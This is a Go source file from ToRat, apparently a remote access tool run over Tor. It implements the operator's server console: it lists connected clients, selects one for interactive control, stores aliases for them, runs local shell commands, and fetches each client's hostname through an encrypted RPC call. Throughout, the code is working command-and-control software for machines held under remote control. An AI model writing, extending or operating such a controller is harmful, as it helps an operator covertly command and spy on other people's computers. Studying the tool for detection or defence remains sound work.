package server

import (
	"fmt"
	"os"
	"strings"

	"github.com/abiosoft/ishell"
	"github.com/lu4p/ToRat/shared"
	"github.com/lu4p/ToRat/torat_server/crypto"
)

var void int

// Shell server side interactive shell menu
func Shell() {
	shell := ishell.New()
	cwd, err := os.Getwd()
	if err != nil {
		fmt.Println(green("[Server] ") + red("[!] ", err))
		panic(err)
	}
	shell.SetPrompt(green("[Server] ") + blue(cwd) + "$ ")

	commands := []*ishell.Cmd{
		{
			// Select client
			Name: "select",
			Func: func(c *ishell.Context) {
				if len(activeClients) == 0 {
					fmt.Println(green("[Server] ") + red("[!] No clients to select!"))
					return
				}
				choice := c.MultiChoice(listConn(), "Select client to interact with:")
				client := getClient(choice)
				client.shellClient()
			},
			Help: "interact with a client",
		},

		{
			// List clients
			Name: "list",
			Func: func(c *ishell.Context) {
				if len(activeClients) == 0 {
					fmt.Println(green("[Server] ") + red("[!] No clients connected yet!"))
					return
				}
				printClients()
			},
			Help: "list all connected clients",
		},
		{
			// Set client alias
			Name: "alias",
			Func: func(c *ishell.Context) {
				if len(activeClients) == 0 {
					fmt.Println(green("[Server] ") + red("[!] No clients connected yet!"))
					return
				}
				choice := c.MultiChoice(listConn(), "Select client to give an alias:")
				fmt.Println(green("Type an alias for selected client:"))
				name := c.ReadLine()
				client := activeClients[choice]

				// TODO: ISSUE #173
				client.Client.Name = name
				db.Save(&client.Client)
			},
			Help: "give a client an alias",
		},
		{
			// Change directory
			Name: "cd",
			Func: func(c *ishell.Context) {
				path := strings.Join(c.Args, " ")
				err := os.Chdir(path)
				if err != nil {
					fmt.Println(green("[Server] ") + red("[!] Cannot navigate to that path!"))
					fmt.Println(green("[Server] ") + red("[!] ", err))
				}
				cwd, _ := os.Getwd()
				shell.SetPrompt(green("[Server] ") + blue(cwd) + "$ ")
			},
			Help: "change the working directory of the server",
		},
		{
			// Exit the server
			Name: "exit",
			Func: func(c *ishell.Context) {
				fmt.Println(green("[Server] ") + red("Exiting Now!"))
				c.Stop()
			},
			Help: "exit the server",
		},
	}

	for _, c := range commands {
		shell.AddCmd(c)
	}

	shell.NotFound(runCommand)
	shell.Run()
}

// Server side shell command
func runCommand(c *ishell.Context) {
	command := strings.Join(c.Args, " ")

	out, err := shared.RunCmd(command, false)
	if err != nil {
		c.Println(green("[Server]"), red("[!] Bad or unknown command: ", err))
		return
	} else if out == nil {
		c.Println(green("[Server]"), "No output returned by command!")
		return
	}
	c.Println(string(out))
}

// Get hostname of client
func (client *activeClient) GetHostname() error {
	var encHostname shared.EncAsym

	err := client.RPC.Call("API.Hostname", void, &encHostname)
	if err != nil {
		return err
	}

	byteHostname, err := crypto.DecAsym(encHostname)
	if err != nil {
		return err
	}

	client.Hostname = string(byteHostname)
	return nil
}
